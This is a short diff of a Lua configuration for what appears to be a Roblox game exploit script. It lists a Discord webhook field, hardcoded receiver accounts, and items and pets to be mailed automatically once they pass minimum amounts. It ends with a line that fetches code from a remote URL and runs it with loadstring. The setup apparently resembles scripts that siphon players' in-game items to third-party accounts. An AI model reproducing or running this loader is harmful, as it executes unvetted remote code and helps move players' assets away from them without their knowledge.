@@ -50,12 +50,6 @@ _G.GWEBHOOK_LINK = "" -- a webhook URL from your private discord channel.
 _G.GMAIL_RECEIVERS = {"LopezCheyenne020", "isaacipaWW4551", "gabrielJWAYM9431"} -- for Mailing items/pets
 _G.GMAIL_ITEMS = {
 ["Send Diamonds"] = {Class = "Currency", Id = "Diamonds", MinAmount = "200m"},
-["All Huges"] = {Class = "Pet", Id = "All Huges", MinAmount = 1},
-["Amethyst Gem"] = {Class = "Misc", Id = "Amethyst Gem", MinAmount = 5000},
-["Emerald Gem"] = {Class = "Misc", Id = "Emerald Gem", MinAmount = 20000},
-["Rainbow Gem"] = {Class = "Misc", Id = "Rainbow Gem", MinAmount = 100},
-["Sapphire Gem"] = {Class = "Misc", Id = "Sapphire Gem", MinAmount = 30000},
-["Ruby Gem"] = {Class = "Misc", Id = "Ruby Gem", MinAmount = 10000},
 }
     loadstring(game:HttpGet(loadstring_URL))()
 end
